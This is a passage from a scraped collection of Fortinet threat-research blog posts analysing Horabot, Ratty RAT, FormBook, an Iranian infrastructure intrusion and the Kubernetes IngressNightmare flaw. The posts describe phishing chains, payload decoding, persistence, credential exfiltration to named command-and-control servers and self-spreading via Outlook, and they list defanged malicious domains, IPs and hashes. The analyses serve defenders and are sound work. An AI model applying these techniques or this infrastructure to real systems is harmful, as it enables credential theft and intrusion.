86d812544f8e250f1b52a4372aaab87565928d364471d115d669a8cc7ec50e17 VanHelsing ransomware Ransomware Roundup FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/ransomware-roundup-vanhelsing"
  },
  {
    "title": "Horabot Unleashed: A Stealthy Phishing Threat",
    "content": "FortiGuard Labs Threat Research Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:Collects victim’s sensitive informationSeverity Level:High In April, FortiGuard Labs observed a threat actor using phishing emails with malicious HTML files to spread Horabot, malware that primarily targets Spanish-speaking users. It is known for using crafted emails that impersonate invoices or financial documents to trick victims into opening malicious attachments and can steal email credentials, harvest contact lists, and install banking trojans. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. Horabot leverages Outlook COM automation to send phishing messages from the victim’s mailbox, enabling it to propagate laterally within corporate or personal networks. The threat actor also executed a combination of VBScript, AutoIt, and PowerShell to conduct system reconnaissance, credential theft, and the installation of additional payloads. Based on the telemetry gathered by FortiGuard Labs, these attacks target users in Latin America, including Mexico, Guatemala, Colombia, Peru, Chile, and Argentina. To trick the recipient into opening the email and attachment, it is written in Spanish from a “legitimate” sender in Mexico, and its subject line references an attached invoice (Factura Adjunta). The message claims to include a PDF invoice for acquired services or products and urges the user to open the attachment. However, the attached ZIP file contains a malicious HTML file with Base64 encoded data in the “iframe” tag. This decoded data is also HTML data with a remote URL “hxxps://t4[.]contactswebaccion[.]store/0704/” used to download the next payload. The URL leads to a web page with JavaScript that immediately attempts to download the hard-coded ZIP file “ADJUNTOS_23042025.zip.” The file “ADJUNTOS_23042025.zip” contains an HTA file with a large number of unused strings in the <body>. The <script> tag uses “moveTo(7426, 6245),” a browser redirection trick that repositions the window. It then loads a script from “hxxps://d1[.]webcorreio[.]pics/LNIJGPNIPPK/WWGDI.” The script on the remote server injects an external VBScript hosted at “hxxps://dl[.]webcorreio[.]pics/g1/.” This VBScript is appended into the HTML <head> element, enabling stealthy execution within the user's browser context. The script serves to check the victim’s environment and deliver additional payloads. The VBScript at “hxxps://dl[.]webcorreio[.]pics/g1/” implements a custom string-decoded routine by processing every two characters, performing mathematical transformations, and reconstructing hidden strings, such as URLs, PowerShell commands, or other instructions. This method helps the malware evade static detection by keeping its real behavior hidden until execution. The following are the main tasks in this script, along with a screenshot of the decoded string: 1. Environment Detection and Evasion 2. Folder Preparation:It checks the working directory and if “C:\\Users\\Public\\LAPTOP-0QF0NEUP” does not exist, it creates it. Otherwise, it quits the script to avoid potential re-infection. 3. Collection and Exfiltration:This process collects the victim's basic information by grabbing the local IP address, computer name, username, and Windows version. It then sends the collected data via HTTP POST to “hxxps://d1[.]webcorreio[.]pics/g1/ctld/salvar.php.” 4. Preparation for AutoIt 5. Preparation for PowerShell:Creates a Batch script (.bat) to decode a text file (.tws) for executing a PowerShell script from “hxxps://labodeguitaup[.]space/a/08/150822/au/au.” This script is responsible for spreading phishing mail. 6. Persistence:First, it deletes all .lnk, .cmd, .bat, .exe, .vbs, and .tws files in the %Startup% and %AppData% folders. It then creates a new shortcut .lnk file pointing to the hidden dropped files related to the AutoIt payload (winupdate_version_686.exe with .ai arguments). It also sets the .lnk file to execute the Batch script during system startup for the PowerShell script. 7. Execution and Cleanup:It executes the created shortcuts via PowerShell commands using ExecutionPolicy Bypass to avoid script execution restrictions and kills mshta.exe. In the following sections, we’ll elaborate on the activities delivered by the encrypted data and the remote PowerShell. The AutoIt script “winupdate_version_067.ai” is for decryption. It finds the “.ia” file in the same directory, decrypts it with the hard-coded key “99521487,” injects the decrypted malicious DLL, and executes the entry point at “B080723_N.” The DLL begins by collecting system information from the victim’s machine, including the current date and time, operating system version, username, hostname, and installed antivirus software. It then sends this data via a POST request to the C2 server “hxxp://209[.]74[.]71[.]168/on7all/index15.php.” The exfiltrated data is organized into two parameters: AT, which carries information such as timestamp, OS type, and user identity, and MD, which specifically identifies the presence and name of antivirus software. This structured telemetry allows the attacker to profile infected systems. The malware then proceeds to steal browser-related data from a range of targeted web browsers, including Brave, Yandex, Epic Privacy Browser, Comodo Dragon, Cent Browser, Opera, Microsoft Edge, and Google Chrome. Once the data is collected, it is exfiltrated to the remote server at “hxxp://93[.]127[.]200[.]211/a/08/150822/au/logs/index.php?CHLG.” In addition to data theft, Horabot monitors the victim’s behavior and injects fake pop-up windows designed to capture sensitive user login credentials. These overlay windows are embedded within the RCData section of the decrypted malicious DLL, enabling stealthy deployment and execution without relying on external visual components. The target script on “hxxps://labodeguitaup[.]space/a/08/150822/au/au” in the previous VBScript intends to execute another six scripts at the remote server “hxxp://93[.]127[.]200[.]211/a/08/150822/au”: “app,” “a2,” “a3,” “a4,” “a5,” and “a6.” For unknown reasons, the “a5” file is empty, but the rest of the files can achieve a full cycle of building a victim list, email automation, and efficient Horabot payload delivery. The “app” acts as an infection check, checking whether a marker file (C:\\Users\\Public\\d240425) exists and exiting if it does. It then forcefully terminates any running instance of Outlook (Outlook.exe) to ensure it can launch Outlook cleanly using a COM object. Then, after creating an Outlook.Application object and accessing its MAPI namespace, it initializes an empty list to collect email addresses and defines a blocked domain list—“gmail,” “hotmail,” “outlook,” “edu,” “con.mx,” and “facebook”—which avoids collecting personal, academic, and Facebook-related emails. The “a2” script contains two functions to build a list of email addresses. The first function is designed to scan the contact data within Outlook’s AddressLists. For each contact, it checks the AddressEntryUserType to determine whether the email address can be directly retrieved or must be resolved via GetExchangeUser() to extract the primary SMTP address. The second function recursively traverses all folders in the Outlook mailbox structure, extracting and filtering email addresses from both recipients and senders of each message using the same logic. The “a3” script saves collected addresses in the “APPDATA\\Microsoft\\.Outlook” to reduce visibility and transmits the email list to an external server, “labodeguitaup[.]space.” It then fetches a payload from another server, “93[.]127[.]200[.]211,” and converts the response content to Base64 for later use. This routine indicates the malware is not only gathering target data but also preparing for future interactions or customized delivery stages. The “a4” script constructs and delivers malicious emails disguised as legitimate invoices. It saves the payload from server “93[.]127[.]200[.]211” with a “.PDF.html” filename and compresses it into a .zip archive that mimics a standard invoice attachment. It then prepares to send this archive as an attachment via Outlook. It references the extracted email address, excluding known domains like Gmail, Yahoo, Hotmail, .edu, Facebook, and .con.mx through the “Verificar-PalavrasBloqueadas” function (Check-BlockedWords). For each valid target, it creates an email item with a subject line referencing a “FWD Factura Adjunta” (FWD Invoice Attached), a Spanish-language body message about the attached invoice, and the malicious zip archive as an attachment. After the emails are sent, the script “a6” removes all traces and deletes related files, reducing the chances of being detected. Horabot is a growing threat demonstrating how phishing attacks are becoming more advanced, especially in Latin America. It spreads through fake Spanish-language emails pretending to be invoices, tricking people into opening harmful attachments. The malware uses VBScript, AutoIt, and PowerShell to hide itself, steal login credentials, and collect email contacts. It then uses Outlook to send itself to more victims, spreading through companies and personal networks. Because it is designed to blend in with normal Windows and Outlook behavior, it can be hard to notice. Organizations should block suspicious emails, watch for unknown file activity, and educate employees to be cautious with phishing scams. The malware described in this report are detected and blocked byFortiGuard Antivirusas: HTML/Phishing.683A!trHTML/Agent.9DFA!trAutoIt/Agent.HA!trBAT/Agent.PR!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard Antivirus Service. The FortiGuard antivirus engine is part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected. We also suggest that organizations take the free FortinetFortinet Certified Fundamentals (FCF)cybersecurity training. The training is designed to help users learn about today's threat landscape and introduces basic cybersecurity concepts and technology. FortiGuard IP ReputationandAnti-Botnet Security Serviceproactively block malware attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. If you believe this or any other cybersecurity threat has impacted your organization, please contact the GlobalFortiGuard Incident Response Team. Domain t4[.]contactswebaccion[.]storef5[.]contactswebaccion[.]spacelabodeguitaup[.]space209[.]74[.]71[.]16893[.]127[.]200[.]211d1[.]webcorreio[.]picsupdatec[.]lat SHA256SCRIPT 523d7e9005b2e431068130989caf4a96062a029b50a5455d37a2b88e6d04f83d84d77737196ea5a8cb0efd8fc3ea61a878d1e1851cc63bcb1e0868019c71996f13a5c60a799c104a7bb1ff1489b82031c2ea1ed10712ca019e996fc0e37e9dfa2ba471519bed0a5503408fee0593bc13547c88cfb10872a9739c2b1eaa5a287ca885b89bb145dde56f6b63fcbf3560fb7179df43df5d212217ca583405beceb8 AUTOIT 25be06643204fc7386db3af84b200d362c3287b30c7491b666c4fe821a8c6eb45368f9f0994b28295aaf7d7af586d78827a95c6eb359a3921ebaa8d2fe1c98a9f7140c28921dcf9ac542965a37b5473432f39b34f00161b6f0c0f8af7c9551a5 BATCH 265a11951f6ac1fd1f150d2711e0158a59416dd709759b39904470f44c83272a370ccca7392282056f20b45829d0cac92acacfc07ab9699c54b3695649713854 Cara Lin FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/horabot-unleashed-a-stealthy-phishing-threat"
  },
  {
    "title": "Multilayered Email Attack: How a PDF Invoice and Geo-Fencing Led to RAT Malware",
    "content": "FortiGuard Labs Threat Research Affected platforms:Windows (primarily), Linux & macOS (if Java is installed)Impacted parties:Users on systems with Java Runtime Environment (JRE) installedImpact:Grants remote access to attackers, enabling them to execute commands, log keystrokes, access files, activate webcam/microphone, and fully control the infected systemSeverity level:High The FortiMail IR team recently uncovered a new email campaign distributing a Remote Access Trojan (RAT) using multiple evasion techniques to target organizations in Spain, Italy, and Portugal. The campaign leverages theserviciodecorreoemail service provider, which is configured as an authorized sender for various domains and successfully passes SPF validation. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. Additionally, it employs advanced evasion strategies, including the abuse of two file-sharing platforms, geolocation filtering, and Ngrok to create secure, obfuscated tunnels. These tactics further complicate detection and effectively mask the attack's true origin, ultimately facilitating the distribution of RATty malware. This campaign highlights the increasing sophistication of malware attack methodologies, leveraging the legitimate functionalities of remote administration tools for malicious purposes. The attacker exploits serviciodecorreo.es, a legitimate Spanish email service authorized to send emails on behalf of various domains. Since the SPF record for these domains designates serviciodecorreo.es as a valid sender, the malicious emails successfully pass SPF checks, creating the illusion of legitimacy. Consequently, these emails are more likely to bypass security filters, making it easier for them to be accepted by the recipient's mail server. This increases the likelihood of a successful attack, as the deceptive nature of the emails goes unnoticed. The sender attaches a PDF file asking the recipient to review two new invoices. This makes the recipient believe this email is important, which may influence them to check the attached files and details. This is basic social engineering to tempt the recipient into acting with less caution and under pressure. The attached PDF file displays a message indicating that the file is not being shown correctly and instructs the recipient to click a button to download the file locally. The button contains a Dropbox (file-sharing platform) link to download an HTML file named \"Fattura\" (Translation: “Invoice”). The choice of this file name plays into the social engineering tactic, aiming to persuade the recipient to click and view the information, ultimately leading to the delivery of a malicious payload. The HTML file contains a basic validation step with an \"I am not a robot\" prompt. After completing the verification, a simple HTML page is displayed with instructions to click a button to view the document. The button redirects the user to a link generated by Ngrok, a tunneling tool that allows users to expose local servers to the internet through secure, temporary URLs. The following URL abuses the MediaFire file-sharing platform by automatically downloading the JAR file (FA-43-03-2025.jar) when accessed. hxxps://download1528[.]mediafire[.]com/35ougpab4uhgHgb3Pmqh8niQ0hzS9b-TtTro5oPV5iUIULfNckqgXvjXQ6aTp-NF-k8EflSnFWC--Ffh4aX1NlYrzaPzgFlyxHVe0fKkLE1p3u5cntfU25orm92QdoQmXE9-gyI4hRgSYpaNcd3o12kJnPRbJhD3aqbl1Qx3vqbUtk8/ayp0ikmndrdseht/FA-43-03-2025.jar Using a legitimate file-sharing service helps attackers further evade detection, as security filters are less likely to flag downloads from trusted platforms. This tactic makes detection and blocking more difficult for security companies since automated analysis systems, sandbox environments, and security researchers often inspect URLs from locations outside the targeted region. By selectively delivering the malware only to specific geolocations, attackers reduce the risk of early detection and increase the likelihood of a successful attack. Below, we can see how this evasion leads to a Google Drive link containing a legitimate file: Ngrok is primarily used to test webhooks, develop locally hosted applications, and bypass NAT/firewall restrictions. However, as in this case, threat actors can misuse Ngrok to create dynamic, hard-to-detect phishing links that evade traditional security filters. Attackers use Ngrok to dynamically generate URLs that help them evade email security filtering mechanisms. One key technique they employ is geo-based cloaking, which serves different content depending on the user's location. In this case, when users access the Ngrok-generated URL from any country except Italy, they are redirected to a seemingly legitimate Google Drive document, making it harder for email security solutions to classify the URL as malicious. The attached fake invoice is identical for all targeted organizations. It is a purported invoice from the global health organization Medinova Health Group, and it has been designed to bypass most email security mechanisms. The seemingly legitimate invoice, shared via Google Drive, is unlikely to raise suspicion during email scanning and is intended to slip past email security engines without triggering any suspicion of malicious intent. However, when the request originates from Italy, the URL changes entirely, leading to downloading a malicious JAR file. Most email security systems perform email analysis from generic or cloud-based environments, not tied to a specific geographic location. As a result, when these systems access the embedded URL, they are redirected to a harmless decoy page rather than the malicious file. This geofencing technique ensures that only users in the targeted regions -in this case, Italy - can reach the actual malicious content. The .jar file contains a type ofRattymalware.  The file name, \"FA-43-03-2025.jar,\" resembles a neutral reference number. While such naming conventions are not unusual, this name was probably specifically chosen to prompt the end user to click and execute the file, assuming it is related to a payment document, thus encouraging hasty and careless action. Ratty RAT is a Java-based Remote Access Trojan (RAT) typically distributed as a .jar file. Since Java is a cross-platform language, Ratty RAT can run on various operating systems as long as the Java Runtime Environment (JRE) is installed. Threat actors use Ratty RAT to execute remote commands, log keystrokes, capture screenshots, and steal sensitive data, often as part of email-based social engineering campaigns with malicious attachments. While it is commonly delivered as a .jar file, attackers may also package it as an MSI (Microsoft Installer) file to increase its legitimacy and evade detection. By bundling the RAT inside an MSI, they can disguise it as legitimate software or an update, making it easier to trick users into executing the malware. What makes this email campaign particularly sophisticated is its combination of multiple tactics designed to evade detection and exploit trusted platforms. Its multi-layered strategy uses social engineering techniques to manipulate recipients into clicking on malicious links. The initial email, disguised as an invoice and sent from a sender who appears legitimate, serves as the entry point. The attacker clearly conducted prior research, identifying which domains allow the use of the specific email service for sending emails, thereby bypassing some critical security measures. The attackers also abuse file-sharing platforms like Dropbox and MediaFire to deliver their malicious payload while leveraging geolocation techniques to tailor the attack based on the recipient's location. Additionally, the use of Ngrok complicates detection by creating secure, obfuscated tunnels that mask the true origin of the attack. Together, these elements create a highly advanced and effective method of distributing malware, including RATty (Remote Access Trojan), which is challenging for traditional security systems to detect and block. Fortinet provides multiple layers of protection against this threat. FortiGate and FortiClient detect and block the malicious JAR file using the latest antivirus (AV) signatures. Customers are advised to ensure their systems are regularly updated with the most recent AV database.Fortinet customers are also already protected from this campaign with FortiGuard’s AntiSPAM, Web Filtering, IPS, and AntiVirus services. FortiMail recognizes the phishing email as “virus detected,” and the FortiMail Content Disarm and Reconstruction (CDR) function automatically detects and mitigates this threat. In addition, FortiSandbox, embedded in Fortinet’s FortiMail, web filtering, and antivirus solutions, provides real-time anti-phishing protection against known and unknown phishing attempts. Perception Point Email Security, now part of Fortinet FortiMail, also proactively detects and blocks emails containing malicious geo-fenced URLs used to deliver malware and phishing content and the RATty JAR file itself. This is achieved through advanced dynamic scanning and static analysis techniques. Combined, these detection capabilities ensure threats are mitigated during delivery, through malicious emails and links, and upon download, delivering end-to-end protection across the entire attack chain.In addition to technical defenses, organizations should adopt Security Awareness Training (SATs) programs and conduct regular phishing simulations. Fortinet’s freeNSE training:NSE 1 – Information Security Awarenessmodule on Internet threats is designed to help end users learn how to identify and protect themselves from phishing attacks.TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. By empowering users to recognize and respond to suspicious content, these initiatives significantly lower the risk of successful phishing or malware attacks.If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team.You can alsosign upto receive future alerts to stay informed of new and emerging threats. IPs 143.47.53.106130.51.20.126199.232.214.172199.232.210.172 Domains: jw8ndw9ev[.]localto[.]netl5ugb6qxh[.]localto[.]net Hash (sha256): a1c2861a68b2a4d62b6fbfc7534f498cefe5f92f720466d24ae1b66ebc9f5731d20d14792c91107f53318ff7df83b9cd98acd3c394959a74e72278682822b6009184ff2cdd05fcaf111db23123479c845b2ece2fedccc2524b2de592f99808765f897fec78e2fd812eb3bc451222e64480a9d5bc97b746cc0468698a634708806153c80b17cb990caad1d80cac72c867d4ecfa1a84b7ab286b7373cd4168794e469b8911fd1ae2ded8532a50e9e66b8d54820c18ccdba49d7a38850d6af54475af8b6ac45918bc87d2a164fae888dab6e623327cba7c2409e4d0ef1dde8d1793 malware FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/multilayered-email-attack-how-a-pdf-invoice-and-geofencing-led-to-rat-malware"
  },
  {
    "title": "FortiGuard Incident Response Team Detects Intrusion into Middle East Critical National Infrastructure",
    "content": "FortiGuard Labs Threat Research The FortiGuard Incident Response (FGIR) team recently investigated a long-term cyber intrusion targeting critical national infrastructure (CNI) in the Middle East, attributed to an Iranian state-sponsored threat group. The attack involved extensive espionage operations and suspected network prepositioning—a tactic often used to maintain persistent access for future strategic advantage. Full Report Available:The following article provides key findings, but a full report of this activity is availablehere. The report includes an analysis of novel malware deployed throughout the intrusion, a detailed breakdown of adversary TTPs across different attack stages, Indicators of Compromise (IOCs) to assist defenders, and attribution considerations for deeper insight. The intrusion persisted from at least May 2023 to February 2025, with signs of compromise dating back as far as May 2021. Attackers initially gained access via stolen VPN credentials and established persistence through multiple web shells and backdoors, including Havoc, HanifNet, HXLibrary, and NeoExpressRAT. They bypassed network segmentation using open-source proxying tools like plink, Ngrok, glider proxy, and ReverseSocks5. Key insights from the investigation include: The attack unfolded in four distinct phases: 1. Establishing a Foothold and Initial Operations (May 2023 – April 2024)The adversary used stolen credentials to access the victim’s SSL VPN, deploying web shells on public-facing servers and installing Havoc, HanifNet, and HXLibrary backdoors. They then stole credentials and moved laterally using RDP and PsExec. 2. Consolidating the Foothold (April 2024 – November 2024)Additional persistence mechanisms were introduced, including NeoExpressRAT. The adversary chained proxies (plink, Ngrok) to bypass segmentation, exfiltrated targeted email data, and began interacting with virtualization infrastructure. 3. Initial Remediation and Adversary Response (November 2024 – December 2024)The victim implemented initial containment steps, prompting a surge in adversary activity. To maintain access, additional web shells, SystemBC, and MeshCentral were deployed, with a focus on targeting deeper CNI network segments. 4. Intrusion Containment and Final Adversary Response (December 2024 – Present)The victim successfully removed adversary access. In response, attackers attempted to re-enter via vulnerabilities in web applications and launched targeted phishing campaigns to steal credentials. Multiple failed access attempts were detected. The victim organization had a highly segmented network, including a restricted Operational Technology (OT) environment. While no confirmed disruption to OT systems was found, FGIR observed targeted reconnaissance and credential harvesting, indicating strong adversary interest in these systems. The attackers moved from IT to restricted segments by chaining proxy tools and implants to bypass segmentation. The attacker relied on VPS-hosted infrastructure, avoiding U.S.-based providers. Notable malware variants used include: State-sponsored cyber adversaries continue to target and compromise critical infrastructure networks, seeking to maintain persistent access. Organizations should prioritize the following defensive measures: This investigation highlights the persistent and evolving nature of state-backed cyber threats targeting Middle Eastern CNIs. The adversary demonstrated advanced tactics to deeply embed themselves, evade detection, and sustain long-term access. Despite containment efforts, the adversary has continued efforts to regain access, indicating a long-term strategic interest in this environment. Organizations must remain vigilant, continuously refining their detection and response strategies to defend against sophisticated, state-sponsored cyber campaigns. For adetailed breakdown of adversary TTPs, novel malware, and IOCs, access the full reporthere. incident response FortiGuard Labs Threat Research FortiGuard Labs Threat Research CISO Collective Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/fortiguard-incident-response-team-detects-intrusion-into-middle-east-critical-national-infrastructure"
  },
  {
    "title": "Key Takeaways from the 2025 Global Threat Landscape Report",
    "content": "FortiGuard Labs Threat Research In 2024, the FortiGuard Labs team observed a decisive shift in the threat landscape: Attackers are compressing the time between reconnaissance and compromise, and the window for defenders to respond is narrowing to days, sometimes hours. The2025 Global Threat Landscape Reportdraws on telemetry from Fortinet’s global sensor network and threat intelligence from FortiGuard Labs to deliver a clear message: the adversary advantage is accelerating. And unless organizations change how they measure and manage risk, the gap will continue to widen. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. Across every stage of the attack chain, automation is reshaping threat behavior. In the reconnaissance phase, cybercriminals launched over 36,000 scans per second in 2024, a 16.7% global increase. These scans are no longer just searching for exposed ports; they’re probing deep into operational technology (OT), cloud APIs, and identity layers. SIP-based VoIP systems, RDP servers, and industrial protocols like Modbus TCP are being mapped automatically and continuously. Automation also extends to phishing, credential theft, and even malware development. Cyber adversaries use AI-powered tools like FraudGPT and ElevenLabs to craft convincing phishing lures, generate deepfake videos, and clone executive voices. Cybercriminals no longer need to write code or breach a system directly; threat actors can purchase access, tools, and infrastructure through a rapidly growing Cybercrime-as-a-Service (CaaS) marketplace. The result is an industrialized cybercrime economy that dramatically lowers the barrier to entry, expands the volume of attacks, and increases their success rate. In 2024, FortiGuard Labs tracked a 42% surge in stolen credentials offered on darknet forums. That’s more than 100 billion unique records—email addresses, passwords, session tokens, and multifactor bypass data—freely traded and sold. Infostealer malware like Redline and Vidar contributed to a 500% increase in credential log activity, much of it harvested in real time and sold by Initial Access Brokers (IABs) offering turnkey infiltration into corporate VPNs, RDPs, and admin panels. These credentials are the backbone of ransomware and espionage operations. Threat actors no longer just hunt for vulnerabilities to exploit; they’re buying entry into your network. And as long as stolen credentials remain abundant, brute force is unnecessary. Cloud services now sit at the center of modern operations, and identity has become one of the most critical security perimeters. Cloud breaches are no longer limited to misconfigured storage buckets. As infrastructure migrates to the cloud, attackers are finding familiar footholds to exploit, such as over-permissioned identities, credential leaks in public code repositories, and lateral movement through cloud-native services. FortiCNAPP telemetry shows that attackers often begin by logging in from unfamiliar geographies, sometimes within hours of a developer’s legitimate activity. From there, they escalate privileges, establish persistence, and use legitimate services to blend into normal network traffic. In 2024, 25% of all cloud incidents began with reconnaissance, such as API enumeration, permission probing, and discovery of exposed assets. Automation is also fueling scale. Fortinet’s intrusion prevention sensors recorded over 97 billion exploitation attempts in the second half of 2024, many targeting vulnerabilities disclosed years ago. CVE-2017-0147 (26.7% of all exploitation attempts), CVE-2021-44228 (11.6%), and CVE-2019-18935 (8%) remain among the most exploited—clear evidence that legacy exposures continue to create present-day risk. IoT devices were also a major target, accounting for over 20% of all exploits. Routers, surveillance cameras, and firewalls with outdated firmware or default credentials are being recruited into botnets, used for lateral movement, or exploited for persistent access. But what’s striking isn’t just the volume of exploitation. It’s how methodical it has become. Attackers aren’t wasting time. They map the exposed surfaces of potential victims, wait for a vulnerability to emerge, and either strike before the organization can apply a patch or sell that vulnerability information on darknet forums. Once inside, adversaries move with precision. In 88% of observed cases involving lateral movement, attackers used RDP to pivot within the network. Remote Access Trojans (RATs) such as Xeno RAT and SparkRAT provided remote command execution, data exfiltration, and long-term persistence. Living-off-the-land techniques using legitimate Windows tools and protocols have made traditional detection approaches less effective. Attackers routinely leveraged PowerShell, WMI, and SMB traffic anomalies to move laterally and escalate privileges. Active Directory manipulation (via DCSync and DCShadow) enabled attackers to harvest credentials and silently expand their access. Encrypted C2 channels, domain generation algorithms, and DNS tunneling were widely used to maintain communication with compromised systems, all while bypassing conventional perimeter defenses. The pattern is clear: Attackers are optimizing for speed, scale, and stealth. Defenders must do the same. Traditional security models that rely on static controls, point-in-time assessments, or delayed patch cycles are increasingly inadequate. What’s needed is a shift toward Continuous Threat Exposure Management (CTEM): This isn’t a technology conversation; it’s a business continuity conversation. Cyberthreats no longer wait for vulnerabilities to be exposed. Their reconnaissance efforts monitor all levels of the network, including compromised credentials and other weaknesses available on darknet forums, so they can strike before your team can respond. The global threat landscape is evolving, but the mission remains the same: reduce exposure, increase visibility, and move faster than the adversary. The Fortinet Security Fabric is designed to meet this challenge, uniting advanced threat intelligence, real-time detection, and coordinated response across the entire digital infrastructure. Executives must ensure their organizations are not only protected but positioned to adapt. Download the full2025 Global Threat Landscape Reportto gain deeper insights into these evolving threats and the strategies needed to counter them. FortiGuard Labs Threat Research Industry Trends Industry Trends Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/key-takeaways-from-the-2025-global-threat-landscape-report"
  },
  {
    "title": "IngressNightmare: Understanding CVE‑2025‑1974 in Kubernetes Ingress-NGINX",
    "content": "FortiGuard Labs Threat Research Affected Platforms:Ingress-NGINX Containers v1.11.0-4, v1.12.0, <v1.11.0Impacted Users:Any OrganizationImpact:Attackers gain control of the vulnerable systemsSeverity Level:Critical On March 24, 2025, researchers from Wiz, Inc. disclosed a critical group of vulnerabilities in the Kubernetes Ingress-NGINX controller, dubbedIngressNightmare. Among the most severe issues isCVE‑2025‑1974, which allows an attacker with only network access to the admission webhook to potentially achieve remote code execution (RCE) in the ingress controller pod. This vulnerability was privately disclosed earlier in March and publicly announced after patches became available. It has a CVSS rating of 9.8, underscoring the severity and urgency of applying the fixes. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. This article summarizes how these CVEs work, explains our proof-of-concept demo of the exploit, and outlines mitigations and detection strategies. We’ll also show how Lacework FortiCNAPP and the broader Fortinet Security Fabric provide coverage for these kinds of attacks. Key Point: In many configurations, the admission webhook is reachable from within the cluster’s network (i.e., from any pod). That means a compromised pod or a foothold within the cluster can exploit these annotation injection flawswithoutneeding Kubernetes API credentials. Our testing confirmed that this exploit path requires an attacker to reach the Ingress-NGINX admission controller on the cluster network. If you can only access the cluster via kubectl port-forward or other indirect means, some temporary file uploading steps may not work reliably. Hence, in practice, this RCE exploit is often executed from a pod that already has an internal vantage point on the cluster network (for example, a malicious container running due to SSRF, a misconfigured job, or a prior partial compromise). When chained, these vulnerabilities let an attacker: We’ve created a short video demonstration that showcases how the exploit works from start to finish, which you can watch here: Network Note: Our tests confirm that port forwarding doesn’t always replicate the network conditions needed to trigger the file upload mechanism. We recommend running the exploit from a pod already in the cluster’s network if you’re assessing your own environment. Because this vulnerability chain can yield near-complete cluster compromise, remediation should be a top priority. Key recommendations include: For a more detailed look at the patch details, see: Within our test environment, we leveragedLacework FortiCNAPPcomponents to gain multi-layered visibility into the compromise: In our demo, alerts were generated when we: Beyond Lacework FortiCNAPP’s container-aware protections, the broaderFortinet Security Fabricprovides additional layers of defense: For a summary of how Fortinet addresses this specific vulnerability and the associated set of CVEs, see theFortiGuard Threat Signal Reportpublished on April 3rd, 2025. IngressNightmare(CVE‑2025‑1974 and related flaws) highlights the importance of secure ingress configurations and strict controls on admission webhooks. By exploiting an internal vantage point, attackers can pivot from a low-privileged pod into a full cluster compromise if the ingress controller is left unpatched and overly exposed. Fortunately, patching and hardening are straightforward: Continuous visibility and detection go hand in hand with strong prevention. Tools likeLacework FortiCNAPPand theFortinet Security Fabricadd significant layers of protection for both container runtime security and the cloud control plane. Organizations can keep their Kubernetes clusters resilient against emerging threats like IngressNightmare by staying current on vulnerability disclosures and employing a defense-in-depth approach. Thank you for reading—and be sure to watch thedemo videofor an in-depth look at this exploit in action. Stay vigilant, and keep your clusters secure! FortiGuard Labs provides an IPS signature against attacks exploiting the following vulnerability: CVE-2025-1974: Kubernetes.Ingress.NGINX.Controller.Remote.Code.Execution If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. Partners Business and Technology Industry Trends Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/ingressnightmare-understanding-cve-2025-1974-in-kubernetes-ingress-nginx"
  },
  {
    "title": "Infostealer Malware FormBook Spread via Phishing Campaign – Part I",
    "content": "FortiGuard Labs Threat Research Fortinet’s FortiGuard Labs observed a phishing campaign in the wild that delivered a malicious Word document as an attachment. This document contained crafted data designed to exploit the vulnerabilityCVE-2017-11882. After conducting an in-depth analysis, I discovered that the campaign was spreading a new variant of Formbook. Formbook is information-stealing malware targeting Windows users. It steals sensitive data from compromised systems, including stored credentials from popular software, the victim’s keystrokes, screenshots, and system clipboard data. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. I will present my research into this malware in a series of analysis blogs. This first one provides insights into how the phishing email tricks the recipient into opening the attached Word document, how it exploits the vulnerability CVE-2017-11882 with crafted equation data, how it downloads and decrypts the fileless FormBook executable, and how it ultimately executes the FormBook malware in a selected target process via process hollowing. The phishing campaign starts with an email disguised as a sales order urging the recipient to open the attached Word document. As shown in Figure 1, FortiMail has flagged the email as “[virus detected]” in the Subject line to warn the recipient. The attached Word document, order0087.docx, is saved in OOXML (Office Open XML) format and compressed as a ZIP archive. Figure 2 reveals the relevant files and file contents inside the Word document. When the recipient opens the Word document, the “<w:altChunk>” node within document.xml is parsed, automatically loading an external file, “Algeria.rtf,” as shown in Figure 2. The RTF file (“Algeria.rtf”) is obfuscated with a large amount of junk data. After de-obfuscating the RTF file, two embedded binary objects (leading by “\\objdata” tag) can be found within it. The first binary object is a package containing a 64-bit DLL file, as shown in Figure 3. The DLL file, named “AdobeID.pdf,” is extracted to the system %temp% folder when the RTF is opened in Microsoft Word. The second binary object is in OLE format and contains crafted equation data intended for Microsoft Equation Editor 3.0. When Word parses the RTF file, this exploits the CVE-2017-11882 vulnerability. CVE-2017-11882is a known remote code execution (RCE) vulnerability in Microsoft Equation Editor (EQNEDT32.EXE). Parsing the crafted equation data in EQNEDT32.EXE causes a buffer overflow, and the return address of the vulnerable function is 